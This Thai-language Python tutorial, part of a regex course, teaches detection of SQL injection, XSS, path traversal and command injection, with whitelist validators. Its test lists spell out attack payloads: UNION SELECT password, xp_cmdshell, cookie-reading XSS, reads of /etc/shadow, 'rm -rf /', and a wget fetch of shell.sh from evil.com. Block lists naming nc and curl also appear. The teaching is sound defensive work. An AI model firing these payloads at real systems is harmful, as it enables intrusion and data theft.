# Part 69: Security Input Validation with Regex

> **ระดับ:** สูง-มืออาชีพ | **เวลาเรียน:** ~85 นาที | **ข้อกำหนด:** Part 01-68

---

## 69.1 SQL Injection Detection Patterns

```python
import re
from typing import List, Dict

print("Security Input Validation with Regex:")
print("=" * 60)

print("\n1. SQL injection pattern detection:")

SQLI_TAUTOLOGY = re.compile(
    r"(?:'|\")\s*(?:OR|AND)\s+(?:'[^']*'|\"[^\"]*\"|\d+)\s*=\s*(?:'[^']*'|\"[^\"]*\"|\d+)",
    re.IGNORECASE
)

SQLI_COMMENT = re.compile(r'(?:--|#|/\*|\*/)(?:\s|$)', re.IGNORECASE)

SQLI_UNION  = re.compile(r'\bUNION\b\s+(?:ALL\s+)?SELECT\b', re.IGNORECASE)

SQLI_STACKED = re.compile(
    r';\s*(?:DROP|DELETE|INSERT|UPDATE|CREATE|ALTER|EXEC|EXECUTE)\b',
    re.IGNORECASE
)

SQLI_SLEEP   = re.compile(
    r'\b(?:SLEEP|BENCHMARK|WAITFOR\s+DELAY|PG_SLEEP)\s*\(',
    re.IGNORECASE
)

SQLI_FUNCTIONS = re.compile(
    r'\b(?:USER\(\)|DATABASE\(\)|VERSION\(\)|SCHEMA\(\)|'
    r'LOAD_FILE|INTO\s+OUTFILE|INTO\s+DUMPFILE)\b',
    re.IGNORECASE
)


def detect_sqli(input_str: str) -> Dict:
    checks = {
        'tautology': SQLI_TAUTOLOGY,
        'comment':   SQLI_COMMENT,
        'union':     SQLI_UNION,
        'stacked':   SQLI_STACKED,
        'sleep':     SQLI_SLEEP,
        'info_func': SQLI_FUNCTIONS,
    }
    findings = {}
    for name, pattern in checks.items():
        m = pattern.search(input_str)
        if m:
            findings[name] = m.group(0)[:50]
    return findings


sqli_payloads = [
    "admin' OR '1'='1",
    "1; DROP TABLE users; --",
    "1 UNION SELECT username, password FROM users",
    "1 AND SLEEP(5)--",
    "' OR 1=1 --",
    "admin'--",
    "1; EXEC xp_cmdshell('dir')--",
    "1 UNION ALL SELECT NULL, VERSION(), DATABASE()",
    "normal_username",
    "alice@example.com",
]

print(f"\n   {'Input':<45} {'Threats'}")
print(f"   {'-'*45} {'-'*30}")
for payload in sqli_payloads:
    threats = detect_sqli(payload)
    if threats:
        print(f"   {payload[:43]:<45} ALERT: {', '.join(threats.keys())}")
    else:
        print(f"   {payload[:43]:<45} OK")
```

---

## 69.2 XSS Detection Patterns

```python
import re
from typing import Dict

print("\nXSS Detection Patterns:")
print("=" * 60)

XSS_SCRIPT   = re.compile(r'<\s*script\b[^>]*>.*?<\s*/\s*script\s*>', re.DOTALL | re.IGNORECASE)
XSS_EVENT    = re.compile(
    r'\bon(?:load|error|click|mouseover|mouseout|keydown|keyup|keypress|'
    r'focus|blur|change|submit|reset|select|abort|contextmenu|dblclick|'
    r'drag|drop|input|invalid|pause|play|scroll|unload)\s*=',
    re.IGNORECASE
)
XSS_HREF     = re.compile(r'\bhref\s*=\s*["\x27]?\s*javascript:', re.IGNORECASE)
XSS_SRC      = re.compile(r'\bsrc\s*=\s*["\x27]?\s*(?:javascript:|data:text/html)', re.IGNORECASE)
XSS_DATA_URI = re.compile(r'data:[^,]*base64', re.IGNORECASE)
XSS_IFRAME   = re.compile(r'<\s*i?frame\b', re.IGNORECASE)
XSS_EXPR     = re.compile(r'\bexpression\s*\(', re.IGNORECASE)
XSS_SVG      = re.compile(r'<\s*svg\b[^>]*>.*?(?:onload|script)', re.DOTALL | re.IGNORECASE)
XSS_TEMPLATE = re.compile(r'\$\{.*\}|`[^`]*\$\{')


def detect_xss(input_str: str) -> Dict:
    checks = {
        'script_tag':    XSS_SCRIPT,
        'event_handler': XSS_EVENT,
        'js_href':       XSS_HREF,
        'js_src':        XSS_SRC,
        'data_uri':      XSS_DATA_URI,
        'iframe':        XSS_IFRAME,
        'css_expr':      XSS_EXPR,
        'svg_xss':       XSS_SVG,
        'template_inj':  XSS_TEMPLATE,
    }
    findings = {}
    for name, pattern in checks.items():
        m = pattern.search(input_str)
        if m:
            findings[name] = m.group(0)[:50]
    return findings


def html_encode(text: str) -> str:
    return (text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
                .replace('"', '&quot;').replace("'", '&#x27;').replace('/', '&#x2F;'))


xss_payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror="alert(document.cookie)">',
    '<a href="javascript:alert(1)">Click</a>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<svg onload=alert(1)>',
    'Hello <b>World</b>',
    '<p onclick="evil()">text</p>',
    'Normal text without HTML',
    '${7*7}',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
]

print(f"\n   XSS detection:")
for payload in xss_payloads:
    threats = detect_xss(payload)
    status  = f"ALERT: {', '.join(threats.keys())}" if threats else "OK"
    encoded = html_encode(payload[:30])
    print(f"   {status:<40} {encoded[:40]!r}")
```

---

## 69.3 Path Traversal & Command Injection

```python
import re
from typing import Dict

print("\nPath Traversal & Command Injection:")
print("=" * 60)

PATH_TRAVERSAL = re.compile(
    r'\.\.[/\\]|'
    r'(?:%2e%2e[%2f%5c])|'
    r'(?:"..%2[fF]")|'
    r'(?:"..%5[cC]")|'
    r'(?:%2[eE]%2[eE][/\\])',
    re.IGNORECASE
)

PATH_TRAVERSAL2 = re.compile(r'\.\.[/\\]|\.\.\/|\.\.\\', re.IGNORECASE)
PATH_NULL_BYTE  = re.compile(r'%00|\x00')
PATH_ABSOLUTE   = re.compile(r'^(?:[A-Za-z]:[/\\]|/(?:etc|proc|sys|bin|usr|var|root|home))')

CMD_INJECTION = re.compile(
    r'[;&|`$]|\$\(|\$\{|'
    r'\b(?:cmd|powershell|bash|sh|wget|curl|nc|ncat|netcat|python|perl|ruby|php)\b',
    re.IGNORECASE
)

CMD_REDIRECT  = re.compile(r'[<>]+|>>|2>&1')

CMD_DANGEROUS = re.compile(
    r'\b(?:rm\s+-rf|format|fdisk|dd\s+if|mkfs|chmod\s+777|'
    r'chown\s+root|sudo\s+|su\s+-|passwd|'
    r'\/etc\/passwd|\/etc\/shadow|\/proc\/self)\b',
    re.IGNORECASE
)


def detect_path_traversal(path: str) -> Dict:
    checks = {
        'dot_dot':   PATH_TRAVERSAL2,
        'null_byte': PATH_NULL_BYTE,
        'absolute':  PATH_ABSOLUTE,
    }
    return {k: True for k, v in checks.items() if v.search(path)}


def detect_cmd_injection(cmd: str) -> Dict:
    checks = {
        'special_chars': CMD_INJECTION,
        'redirects':     CMD_REDIRECT,
        'dangerous_ops': CMD_DANGEROUS,
    }
    return {k: True for k, v in checks.items() if v.search(cmd)}


path_tests = [
    '../../../etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '/var/www/html/../../etc/shadow',
    'normal/path/to/file.txt',
    '/etc/passwd%00.jpg',
    'C:\\Windows\\System32\\config',
    'uploads/profile.jpg',
]

cmd_tests = [
    'ls -la',
    'echo hello; rm -rf /',
    'ping 8.8.8.8 && wget http://evil.com/shell.sh',
    'normal_command',
    '`id`',
    '$(whoami)',
    'file.txt | cat /etc/shadow',
]

print(f"\n   Path traversal detection:")
for path in path_tests:
    threats = detect_path_traversal(path)
    status  = f"BLOCK: {list(threats.keys())}" if threats else "ALLOW"
    print(f"   {path[:40]:<42} {status}")

print(f"\n   Command injection detection:")
for cmd in cmd_tests:
    threats = detect_cmd_injection(cmd)
    status  = f"BLOCK: {list(threats.keys())}" if threats else "ALLOW"
    print(f"   {cmd[:40]:<42} {status}")
```

---

## 69.4 Input Sanitization & Whitelisting

```python
import re
from typing import Tuple

print("\nInput Sanitization & Whitelisting:")
print("=" * 60)

SAFE_USERNAME  = re.compile(r'^[a-zA-Z][a-zA-Z0-9_-]{2,31}$')
SAFE_EMAIL     = re.compile(r'^[a-zA-Z0-9._%+-]{1,64}@[a-zA-Z0-9.-]{1,255}\.[a-zA-Z]{2,10}$')
SAFE_SLUG      = re.compile(r'^[a-z0-9][a-z0-9-]{0,98}[a-z0-9]$|^[a-z0-9]$')
SAFE_FILENAME  = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9_.-]{0,254}$')
SAFE_UUID      = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', re.IGNORECASE)
SAFE_HEX_COLOR = re.compile(r'^#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{6})$')
SAFE_SEMVER    = re.compile(r'^(?:0|[1-9]\d*)\.(?:0|[1-9]\d*)\.(?:0|[1-9]\d*)(?:-[0-9a-zA-Z.-]+)?$')

STRIP_HTML  = re.compile(r'<[^>]+')
STRIP_NULL  = re.compile(r'\x00')
STRIP_EXTRA = re.compile(r'\s{2,}')


def sanitize_text(text: str, max_len: int = 1000) -> str:
    text = STRIP_NULL.sub('', text)
    text = STRIP_HTML.sub('', text)
    text = STRIP_EXTRA.sub(' ', text).strip()
    return text[:max_len]


def validate_and_sanitize(field: str, value: str) -> Tuple[bool, str, str]:
    validators = {
        'username':  (SAFE_USERNAME,  lambda v: v),
        'email':     (SAFE_EMAIL,     lambda v: v.lower().strip()),
        'slug':      (SAFE_SLUG,      lambda v: v.lower()),
        'filename':  (SAFE_FILENAME,  lambda v: v),
        'uuid':      (SAFE_UUID,      lambda v: v.lower()),
        'hex_color': (SAFE_HEX_COLOR, lambda v: v.upper()),
        'semver':    (SAFE_SEMVER,    lambda v: v),
    }
    if field not in validators:
        return False, value, f"Unknown field type: {field}"
    pattern, normalizer = validators[field]
    cleaned = normalizer(value.strip())
    if pattern.match(cleaned):
        return True, cleaned, "ok"
    return False, '', f"Invalid {field}"


test_inputs = [
    ('username', 'alice_123'),
    ('username', 'a'),
    ('username', 'admin; DROP TABLE'),
    ('email', 'Alice@Example.COM'),
    ('email', 'not-an-email'),
    ('slug', 'my-blog-post-2024'),
    ('slug', 'Has Spaces!'),
    ('uuid', '550e8400-e29b-41d4-a716-446655440000'),
    ('uuid', 'not-a-uuid'),
    ('hex_color', '#ff5733'),
    ('hex_color', 'red'),
    ('semver', '1.2.3'),
    ('semver', '1.2.3-beta.1'),
    ('semver', '1.2'),
]

print(f"\n   {'Field':<12} {'Input':<40} {'Valid':<8} {'Result'}")
print(f"   {'-'*12} {'-'*40} {'-'*8} {'-'*20}")
for field, value in test_inputs:
    ok, cleaned, msg = validate_and_sanitize(field, value)
    status = '\u2713' if ok else '\u2717'
    result = cleaned[:20] if ok else msg[:20]
    print(f"   {field:<12} {value:<40} {status:<8} {result}")
```

---

## 69.5 สรุป Part 69

```
Security Input Validation Patterns:

1. SQL Injection:
   Tautology: '[^']*'\s*OR\s*'[^']*'\s*=\s*'[^']*'
   Union:      UNION\s+(ALL\s+)?SELECT
   Stacked:    ;\s*(DROP|DELETE|INSERT)\b
   Comment:    (--|#|/\*)\s*$
   Sleep:      (SLEEP|BENCHMARK|WAITFOR)\s*\(

2. XSS:
   Script:     <\s*script\b
   Event:      \bon(load|error|click)\s*=
   JS href:    href\s*=\s*['"]?\s*javascript:
   Data URI:   data:[^,]*base64

3. Path Traversal:
   Dot-dot:   \.\.[/\\]|%2e%2e[%2f%5c]
   Null byte: %00|\x00
   Absolute:  ^[A-Za-z]:[/\\] or ^/(etc|proc)

4. Command Injection:
   Operators: [;&|`$]|\$\(|\$\{
   Chaining:  &&|\|\|
   Dangerous: rm\s+-rf|chmod\s+777|/etc/passwd

5. Whitelisting (safest approach):
   Username:  ^[a-zA-Z][a-zA-Z0-9_-]{2,31}$
   Slug:      ^[a-z0-9][a-z0-9-]{0,98}[a-z0-9]$
   UUID:      ^[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}$
   HexColor:  ^#([0-9a-fA-F]{3}|[0-9a-fA-F]{6})$

Defense principle:
  Whitelist > Blacklist
  Parameterized queries > regex filtering for SQL
  Context-aware encoding > stripping for XSS
```

---

*[\u2190 Part 68: Log Analysis & Monitoring](part-68-log-analysis.md) | [\u2192 Part 70: JWT & Token Parsing](part-70-jwt-tokens.md)*
